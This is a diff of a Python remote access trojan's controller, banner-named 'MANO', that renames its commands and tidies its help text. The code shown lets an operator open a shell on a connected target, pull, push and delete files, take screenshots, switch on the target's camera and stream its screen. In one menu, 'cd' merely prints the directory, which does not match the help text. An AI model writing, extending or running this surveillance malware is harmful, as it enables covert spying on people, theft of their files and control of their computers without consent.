@@ -1,6 +1,15 @@
-import socket,sys,os,threading
+#copyright © 2019-2021 manoharkakumani
+import socket
+import sys
+import os
 import threading
-import time,shutil,cv2,pyautogui,pickle,struct,numpy as np
+import time
+import shutil
+import cv2
+import pyautogui
+import pickle
+import struct
+import numpy as np
 from queue import Queue
 
 THREADS = 2
@@ -16,7 +25,7 @@ print("""
 | |\/| | / _ \ |  \| | | | |  \ \ 
 | |  | |/ ___ \| |\  | |_| |  / / 
 |_|  |_/_/   \_\_| \_|\___/  /_/
-copyright © 2019 manoharkakumani""")
+copyright © 2019-2021 manoharkakumani""")
 print("\n******************************************************")
 
 # Create a Socket ( connect two computers)
@@ -359,13 +368,13 @@ def menu(cip,conn):
             fdown(conn)
         elif cli=='fup':
             fup(conn)
-        elif cli=='flist':
+        elif cli=='fl':
             flist()
-        elif cli=='cflist':
+        elif cli=='cfl':
             cflist(conn)
-        elif cli=='chdir':
+        elif cli=='cd':
             chdir()
-        elif cli=='cchdir':
+        elif cli=='ccd':
             cchdir(conn)
         elif cli=='cdel':
            if(cdel(conn)):
@@ -373,11 +382,11 @@ def menu(cip,conn):
         elif cli=='fdel':
              if(fdel()):
                  print("SUCCESS!")
-        elif cli=='getcd':
-             print("your current working dir :"+os.getcwd())
-        elif cli=='getccd':
+        elif cli=='pwd':
+             print("Your current working directory :"+os.getcwd())
+        elif cli=='cwd':
              conn.send(('cwd~s').encode("utf-8"))
-             print("client current working dir :"+conn.recv(1024).decode("utf-8"))
+             print("Client current working directory :"+conn.recv(1024).decode("utf-8"))
         elif cli=='sshot':
              conn.send(('sshot~s').encode("utf-8"))
              msg=conn.recv(1024).decode("utf-8")
@@ -398,14 +407,23 @@ def menu(cip,conn):
             return
         elif cli == 'help':
             print("""
-shell --> To open cmd or terminal \n
-fdown --> to download files from client\nfup --> upload files to client \n
-flist --> List files in current dir \ncflist --> List files in client's current dir \n
-getcd --> Get current dir\ngetccd --> Get client's current dir \n
-chdir --> Change current dir\ncchdir --> Change client's current dir \n
-fdel --> Delete file in current dir \ncdel --> Delete file from client's current dir \n
-sshot --> Take screenshot\ncam --> To access client camera\nsst --> Screen Stream\n
-help --> help \nback --> back to MANO\nexit -->to terminate : """+cip+"""\n""")
+shell   --> To open cmd or terminal\n
+fdown   --> To download files from target\n
+fup     --> Upload files to client\n
+fl      --> List of files in your current directory\n
+cfl     --> List of files in target's current directory\n
+pwd     --> Get your current directory\n
+cwd     --> Get target's current directory\n
+cd      --> Change your current directory\n
+ccd     --> Change target's current directory\n
+fdel    --> Delete file in your current directory\n
+cdel    --> Delete file from target's current directory\n
+sshot   --> To take screenshot of target's screen\n
+cam     --> To access target camera\n
+sst     --> To stream target screen\n
+help    --> Help \n
+back    --> Back to MANO\n
+exit    --> To terminate : """+cip+"""\n""")
         else :
               print("Command not recognized")
 #MANO 
@@ -422,16 +440,20 @@ def MANO():
              chdir()
         elif cmd=='fdel':
              fdel()
-        elif cmd=='flist':
+        elif cmd=='fl':
              flist()
-        elif cmd=='getcd':
-             print("your current working dir :"+os.getcwd())
+        elif cmd=='cd':
+             print("Your current working directory :"+os.getcwd())
         elif cmd == 'help':
             print("""
-list --> See all the clients \nselect n  --> to select n th client \n
-getcd --> Get current dir\nchdir --> Change current dir \n
-flist --> List files in current dir \nfdel --> Delete file in  current dir\n
-help --> help \nquit --> quit\n""")
+list      --> See all the clients\n
+select n  --> To select n th client\n
+pwd       --> Get current directory\n
+cd        --> Change current directory\n
+fl        --> List of files in current directory\n
+fdel      --> Delete file in  current directory\n
+help      --> Help \n
+quit      --> quit\n""")
         elif cmd == 'quit':
             closeconn()
             return
